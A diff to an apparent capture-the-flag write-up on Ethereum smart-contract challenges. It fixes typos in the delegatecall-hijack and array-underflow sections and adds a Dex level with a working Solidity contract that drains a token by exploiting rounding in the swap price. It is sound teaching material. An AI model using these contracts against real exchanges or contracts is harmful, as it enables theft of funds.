@@ -718,7 +718,7 @@ This a fairly complicated challenge in comparison to the others. The goal of thi
 
 The contract has two methods, namely, `setFirstTime()` and `setSecondTime()`. These methods delegatecalls a method defined in another external contract whose address is stored in the variables `timeZone1Library` and `timeZone1Library`. The external contract has a single variable in it, and the method defined updates that variable. But, we have to remember that delegate is used to run a piece of code in context of the contract the makes the call. So, when our challenge contract delegate calls the external contract, instead of updateing the variable of the external contract, the variable of the challenge contract will get updated using the code of the external contract. However, the catch here is that the storage order is not same in these contracts. This is what can be exploited here.
 
-To solve this challenge I have defined a hack contract, that has the same order of storage as the challenge contract. In the attack function, I am calling the `setFirstTime()` function twice. In the first call, the address of the hack contract is being converted uint256 and is passed as an argument, since this method will accept arguments of type `uint256` only. This in turn will make a delegate call to the external contract with the hack contract's address as the argument. Now, since the `storedTime` variable which get's updated in the external contract occupies the storage slot 0, when a delegate call is made to the external contract, the variable which is defined in slot 0 in the challenge contract, i.e. the first variable defined in the challenge contract will get updated, and it will now be holding the hack contract's address instead of the external contract's address. I have also defined another function in the hack contract with the same signature as the function, i.e. `setTime()` which is being delegate called in the challenge contract. So, when the `setFirstTime()` function is called for the second time in the attack function, it will call the `setFirstTime()` function in the challenge contract which will delegate call the `setTime()` function. But, instead of calling the `setTime()` function defined in the external contract, the same function defined in the hack contract will be called this time, since the address of the external contract was updated to the hack contract's address previously. The `setTime()` defined in the hack contract updates owner variable, and sice the storage order of the hack contract is same as that of the challenge contract, the owner variable of the challeneg contract will get updated with `msg.sender` which is our wallet's address, hence solving the challenge. Find below the hack contrcat along with the challenge contract -
+To solve this challenge I have defined a hack contract, that has the same order of storage as the challenge contract. In the attack function, I am calling the `setFirstTime()` function twice. In the first call, the address of the hack contract is being converted uint256 and is passed as an argument, since this method will accept arguments of type `uint256` only. This in turn will make a delegate call to the external contract with the hack contract's address as the argument. Now, since the `storedTime` variable which get's updated in the external contract occupies the storage slot 0, when a delegate call is made to the external contract, the variable which is defined in slot 0 in the challenge contract, i.e. the first variable defined in the challenge contract will get updated, and it will now be holding the hack contract's address instead of the external contract's address. I have also defined another function in the hack contract with the same signature as the function, i.e. `setTime()` which is being delegate called in the challenge contract. So, when the `setFirstTime()` function is called for the second time in the attack function, it will call the `setFirstTime()` function in the challenge contract which will delegate call the `setTime()` function. But, instead of calling the `setTime()` function defined in the external contract, the same function defined in the hack contract will be called this time, since the address of the external contract was updated to the hack contract's address previously. The `setTime()` defined in the hack contract updates owner variable, and sice the storage order of the hack contract is same as that of the challenge contract, the owner variable of the challeneg contract will get updated with `msg.sender` which is our wallet's address, hence solving the challenge. Find below the hack contract along with the challenge contract -
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -901,7 +901,7 @@ ___
 
 This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload and the arithmetic underflow of array length. The goal of the challenge is to gain ownership of the contract. However, we are unable to see any owner variable. But, the challenge contract inherits from another contract 'ownable'.
 
-On inspecting the contracts abi, I found that the owner variable is stored in slot 0 of the contract. Additionally, the compiler version of the challenge contrcat is old and thus isn't protected to underflows and overflows. We can see that a bytes32 array named codex has been defined in the contract and a function `retract()` is also defined, which reduces the length of the array by 1. Again, in older versions of solidity array elements could be deleted by reducing the length of an array. Here, codex hasn't been changed anywhere in the contrcat, so it is empty. Now, if we reduce it's length by 1 by calling the `retract()` function, an underflow will occur since the length is 0, and the new length will become 2^256-1, meaning, it will occupy all the 2^256 slots of the entire smart contract's storage. But, to call the `retract()` function, the value of the `contact` variable must be 0. So, the first step should be to call the `makeContact()` function. Now, we an call the retract function. Once the codex array occupies the entire contrcat's storage, it will overlap with some of the slots which stores other declared variables, including the owner variable, which was stored in slot 0. So, now, if we are able to find out the index of the array in which the owner variable is stored, we can easily modify it using the `revise()` function. To do that, let us understand the storage layout of the contract.
+On inspecting the contracts abi, I found that the owner variable is stored in slot 0 of the contract. Additionally, the compiler version of the challenge contract is old and thus isn't protected to underflows and overflows. We can see that a bytes32 array named codex has been defined in the contract and a function `retract()` is also defined, which reduces the length of the array by 1. Again, in older versions of solidity array elements could be deleted by reducing the length of an array. Here, codex hasn't been changed anywhere in the contract, so it is empty. Now, if we reduce it's length by 1 by calling the `retract()` function, an underflow will occur since the length is 0, and the new length will become 2^256-1, meaning, it will occupy all the 2^256 slots of the entire smart contract's storage. But, to call the `retract()` function, the value of the `contact` variable must be 0. So, the first step should be to call the `makeContact()` function. Now, we an call the retract function. Once the codex array occupies the entire contract's storage, it will overlap with some of the slots which stores other declared variables, including the owner variable, which was stored in slot 0. So, now, if we are able to find out the index of the array in which the owner variable is stored, we can easily modify it using the `revise()` function. To do that, let us understand the storage layout of the contract.
 
 ```
 Slot 0 = Owner (address - 20 bytes), contact (boolean - 1 byte)
@@ -923,7 +923,7 @@ codex[i] = slot start + i = slot 0
 
 `keccack256(<storage slot where the array has been declared>)` gives the slot from where the array elements are stored. So, in this case we have used `keccack256(1)` since the codex array is defined in slot 1. So, based on the above understanding, we can easily find the index of the codex array where the owner variable is stored due to the overlapping. Now, using the index we can easily pass our wallet's address to the `revise()` function to overwrite the owner variable.
 
-Find the hack contrcat below
+Find the hack contract below
 
 ```solidity
 interface IAlienCodex {
@@ -1024,6 +1024,114 @@ contract hack {
 
 So, the key takeaway from this level is that we should never change the state of our contract based on an unknown contract's logic, otherwise, our contract can be easily manipulated by other external contracts.
 
+___
+## Level 22 [Dex]
 
+Dex is short for decentralized exchange, which happens to be one of the most popular dapps out there. Simply put, these platforms or at a grass root level, contracts, help in exchanging tokens. The challenge contract given to us is one such dapp which has got two tokens associated with it. The contract initially has 100 tokens each of token 1 and 2, while we are provided with 10 tokens of type. The goal of the challenge is to drain one of the tokens so that it's number becomes 0.
+
+There are two functions of interest here.
+
+```solidity
+    function swap(address from, address to, uint256 amount) public {
+        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+        uint256 swapAmount = getSwapPrice(from, to, amount);
+        IERC20(from).transferFrom(msg.sender, address(this), amount);
+        IERC20(to).approve(address(this), swapAmount);
+        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+    }
+
+    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
+        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+    }
+```
+
+The `swap()` function checks that we are performing the exchange between token1 and token2 only, and also that our balance is not less than the exchange amount. Then it calls the `getSwapPrice()` method to calculate the `swapAmount` and transfers the desired number of tokens of one type to get `swapAmount` number of tokens of the other type.
+
+The `getSwapPrice()` method applies a formula which calculates the amount of tokens one can get on exchanging a certain amount of tokens based on the available tokens in the dex contract of each type. Find the formula below.
+
+`number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract`
+
+This formula works if we exchange token2 for token1 as well, we will just need to replace token1 with token2 and vice versa in the formula.
+
+Now, the problem with this exchange formula is that it employs division, without taking into consideration that solidity doesn't support floating point numbers. Hence, the numbers from the divisions will be roundednd off, and there will be some precision loss, making this function vulnerable. Look at the below table to understand this in detail.
+
+
+|Dex  || User  |         |
+|------|------|------|-----|
+| token1|token2|token1|token2|
+|:------|------|------|-----:|
+|100|100|10|10|
+|110|90|0|20|
+|86|110|24|0|
+|110|80|0|30|
+|69|110|41|0|
+|110|45|0|65|
+|0|90|110|20|
+
+
+We start the exploit by exchanging all 10 token1 for 10 token2, which leaves us with 20 token2 and 0 token 1. Then we swap these 20 token2 and get 24 token 1. So, here comes the trick. Notice that we have obtained more number of token1 than we had initially. So, we continue this untill we arrive at a number after which, we can drain all the token1 in dex. After 5 swaps, we will have 65 token2. Now, to drain all the token1 (number of token1 in dex = 0), let us use the exchange formula agin with some high school mathematics.
+
+```
+number of token1 to be returned = (amount of token2 to be swapped * token1 balance of the contract)/token2 balance of the contract
+=> 110 = (token2 * 110)/45
+=> token2 = (110 * 45)/110
+=>token2 = 45
+```
+
+So, we exchanged 45 token2 to get 110 token1 in the last swap draining all the token1 in dex. Find the hack contract below.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IDex {
+    function token1() external view returns (address);
+    function token2() external view returns (address);
+    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
+    function swap(address from, address to, uint256 amount) external;
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+contract hack {
+    IDex private immutable dex;
+    IERC20 private immutable token1;
+    IERC20 private immutable token2;
+
+    constructor(IDex target) {
+        dex = target;
+        token1 = IERC20(dex.token1());
+        token2 = IERC20(dex.token2());
+
+    }
+
+    function attack () external {
+        token1.transferFrom(msg.sender, address(this), 10);
+        token2.transferFrom(msg.sender, address(this), 10);
+
+        token1.approve(address(dex), type(uint).max);
+        token2.approve(address(dex), type(uint).max);
+        
+        dex.swap(address(token1), address(token2), 10);
+        dex.swap(address(token2), address(token1), 20);
+        dex.swap(address(token1), address(token2), 24);
+        dex.swap(address(token2), address(token1), 30);
+        dex.swap(address(token1), address(token2), 41);
+        dex.swap(address(token2), address(token1), 45);
+        }
+
+}
+```
+To complete this challenge, we need to deploy the hack contract and then approve it to spend tokens on behalf of us. To do so, we obtain the address of token1 and token2 by deploying the IDex interface at the instance address and getting the values of variables `token1` and `token2`. Then, we deploy the IERC20 interface at token1 and token2 address. Then, we can use the `approve()` method to approve the hack contract to spend some tokens (I approved for 100 tokens) on behalf of us. Notice that I have called approve methods inside the hack contract as well. That is so that the dex contract can spend tokens on our behalf during the swap.
+
+So, what we can learn from this challenge is that we should be very careful while using divisions in solidity, also when delaing with prices of something in contracts, it is better not to rely on only one source of information, like was done in this challenge. Because, if that source gets hacked or compromised, then the whole system will become centralized and the person controlling the source of information can control the contract. Normally, we rely on external sources for prices by employing oracle networks. Again, using a single oracle can give rise to the same problem, so, a network of oracles can be used and when the data from these oracles are fetched, it can be aggregated to get a single value which can be trusted throughout the whole chain.
 
 # More solutions coming soon!
